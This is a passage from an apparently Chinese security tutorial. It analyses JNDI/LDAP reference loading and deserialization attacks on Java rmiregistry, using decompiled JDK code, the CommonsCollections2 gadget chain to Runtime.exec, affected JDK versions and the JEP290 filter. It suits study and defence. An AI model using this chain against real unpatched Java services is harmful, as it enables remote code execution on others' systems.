lookup 函数开始一直往下执行，执行到 LdapCtx.c_lookup 方法时，发送查询信息到服务端并解析服务端的返回数据

```
protected Object c_lookup(Name var1, Continuation var2) throws NamingException {
    var2.setError(this, var1);
    Object var3 = null;

    Object var4;
    try {
        SearchControls var22 = new SearchControls();
        var22.setSearchScope(0);
        var22.setReturningAttributes((String[])null);
        var22.setReturningObjFlag(true);
        //此处客户端向服务端进行查询并获得查询结果
        LdapResult var23 = this.doSearchOnce(var1, "(objectClass=*)", var22, true);
        this.respCtls = var23.resControls;
        if (var23.status != 0) {
            this.processReturnCode(var23, var1);
        }

        if (var23.entries != null && var23.entries.size() == 1) {
            LdapEntry var25 = (LdapEntry)var23.entries.elementAt(0);
            var4 = var25.attributes;
            Vector var8 = var25.respCtls;
            if (var8 != null) {
                appendVector(this.respCtls, var8);
            }
        } else {
            var4 = new BasicAttributes(true);
        }

        if (((Attributes)var4).get(Obj.JAVA_ATTRIBUTES[2]) != null) {
          //将查询的结果，也就是我们在server端所添加的那几条属性进行解析，并返回一个Reference对象  
          var3 = Obj.decodeObject((Attributes)var4);
        }
  ......
    try {
      //此后的操作就和rmi Reference一样的通过实例化URLClassloader对像，根据Reference中的信息去远程加载恶意类
        return DirectoryManager.getObjectInstance(var3, var1, this, this.envprops, (Attributes)var4);
......
}
```

关键点在于 var3 = Obj.decodeObject((Attributes)var4) 这行代码解析完成后所返回的结果，如下图所示。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dG3IRIwCQwibhggQLyM5Fp50J6iaw6OP9bqXhkGd0V95AP4uwWm3WKUaEKiaibUFZc9heOzMpNibaW2SWQ/640?wx_fmt=png)

然后在 DirectoryManager.getObjectInstance(var3, var1, this, this.envprops, (Attributes)var4) 这行代码中根据 Reference 中的信息 实例化 URLClassloader 去远程加载恶意类。

这种方法一直到 jdk 8u191 之前的版本都是可用的，但是在之后的版本中同 JNDI rmi Reference 一样，添加了对 com.sun.jndi.ldap.object.trustURLCodebase 属性的校验，该值默认为 false

**0x07  服务端攻击 rmiregistry**
===========================

接下来我们就要讲通过服务端来攻击 rmiregistry 了，和客户端服务端互相攻击的方式比起来相对复杂那么一些，确切的说是通过伪造一个服务端的形式，因为之前说这 rmiregistry 通常都和真正的服务端出在同一个主机，同一个项目上，根据我们之前对 RMI 流程的分析，服务端在通过 bind 方法向 rmiregistry 绑定远程方法信息时，rmiregistry 会反序列化服务端传来的数据，在 rmiregistry 方处理服务端传来的数据时会调用 RegistryImpl_Skel 的 dispatch 方法，其中会反序列化服务端传来的两个信息，一个是远程方法提供服务的注册名，另一个是封装有远程方法提供服务方信息的 Proxy 对象。  

```
//获取输入流
var9 = var2.getInputStream();
//反序列化“hello”字符串
var7 = (String)var9.readObject();
//这个位置本来是属于反序列化出来的“HelloImpl”对象的，但是最终结果得到的是一个Proxy对像
//这个很关键，这个Proxy对象即所为的Stub(存根)，客户端就是通过这个Stub来知道服务端的地址和端口号从而进行通信的。
//这里的反序列化点很明显是我们可以利用的，通过RMI服务端执行bind，我们就可以攻击rmiregistry注册中心，导致其反序列化RCE
var80 = (Remote)var9.readObject();
```

第一个 String 类型的数据反序列化我们没有利用的思路，因为 String 是一个 final 类型，没办法继承和实现，我们入手的点就只能是下面的那个 var80 = (Remote)var9.readObject(); 之前分析 RMI 流程代码时有一个点没有提到，就是 bind 方法在序列化一个远程对象时会将转化成一个 proxy 对象然后再进行序列化操作并传输给 rmiregistry，序列化的 proxy 对像默认是实现 Remot 接口并封装 RemoteObjectInvocationHandler 的，但是如果传递的远程对象本身就是 Proxy 则不会进行任何转化直接传递，由 MarshalOutputStream 对象的 replaceObject 方法来实现具体操作，代码如下。

```
protected final Object replaceObject(Object var1) throws IOException {
    if (var1 instanceof Remote && !(var1 instanceof RemoteStub)) {
        Target var2 = ObjectTable.getTarget((Remote)var1);//生成一个Target对象，其中有一个stub属性就是转化好的Proxy对象
        if (var2 != null) {
            return var2.getStub();//返回Proxy对象
        }
    }

    return var1;
}
```

那么这样以来，似乎攻击的思路就突然清晰了，我们只需要找一个 rmiregistry 中可以利用的 Gadget 然后，ysoserial 中的 RMIRegistryExploit 就是针对使用了版本低于 JDK8u121 的 rmiregistry 进行反序列化攻击的一个工具。

此次的测试环境是 jdk1.7_21，采用 CommonCollection2 作为 payload 来进行尝试和分析。由于 CommonCollection2 封装的过程中用到了

```
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
```

所以在 rmiregistry 这边将 commons-collections4 引入

```
<dependency>
    <groupId>org.apache.commons</groupId>
    <artifactId>commons-collections4</artifactId>
    <version>4.0</version>
</dependency>
```

然后展示一下服务端这边最终封装完后的一个 Proxy，服务端将这个 Proxy 序列化后 传递给 rmiregistry，然后 rmiregistry 反序列化该数据从而出发漏洞执行命令

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dG3IRIwCQwibhggQLyM5Fp50q4sGDC07D3ibVesNMibuz2f4h5VMNibQCzvK7I2q24DetC3dylzX5mp8Q/640?wx_fmt=png)

最终的调用链简化一下，如下所示

```
AnnotationInvocationHandler.readObject()
HashMap.readObject()
PriorityQueue.readObject()
PriorityQueue.heapify()
PriorityQueue.siftDown() 
PriorityQueue.siftDownUsingComparator()
TransformingComparator.compare()
InvokerTransformer.transform()
TemplatesImpl.newTransformer()
TemplatesImpl.getTransletInstance()
Runtime.exec()
```

具体的反序列化过程就不做分析了

但是要注意一点就是 jdk 8u121 版本以后，在 rmiregistry 创建时不是有这么一段代码么 this.setup(new UnicastServerRef(var2, RegistryImpl::registryFilter)); 传入了 RegistryImpl::registryFilter 作为参数，所以在 rmiregistry 这边反序列化服务端传递来的 Proxy 对象时，是会进行对象的白名单校验的，只有以下对象才能进行反序列化

```
String.class != var2 
&& !Number.class.isAssignableFrom(var2) 
&& !Remote.class.isAssignableFrom(var2) 
&& !Proxy.class.isAssignableFrom(var2) 
&& !UnicastRef.class.isAssignableFrom(var2) 
&& !RMIClientSocketFactory.class.isAssignableFrom(var2) 
&& !RMIServerSocketFactory.class.isAssignableFrom(var2) 
&& !ActivationID.class.isAssignableFrom(var2) 
&& !UID.class.isAssignableFrom(var2)
```

但是我们在构造恶意类的时候使用的是 CommonCollection2，registryFilter 在反序列化完最外面的 proxy 对象后第二要要反序列化的就是 AnnotationInvocationHandler，而 AnnotationInvocationHandler 根本就不在上面的白名单里所以自然会抛出异常

```
ObjectInputFilter REJECTED: class sun.reflect.annotation.AnnotationInvocationHandler
```

这个白名单过滤机制也就是所谓的 JEP290, 就是可以通过实现 ObjectInputFilter 这么一个函数式接口的方式来自定义自己想要过滤的类，在使用了该机制以后，ysoserial 中所有的 gadget 几乎都不可用了, 需要想办法绕过这个白名单才行。

**0x08  总结**
============

在以上的讲解中，我们分析了 RMI 客户端，服务端以及 rmiregistry 之间的关系，也对三方之间的多种攻击方式进行了详细的介绍，希望大家在看完文章后可以自己再跟随文章的步骤，手动调试一下这个过程，这样可以加深大家对 RMI，JRMP，以及 JNDI 的理解。

**0x09  参考链接**
==============

https://xz.aliyun.com/t/7079

https://xz.aliyun.com/t/7264

https://paper.seebug.org/1091/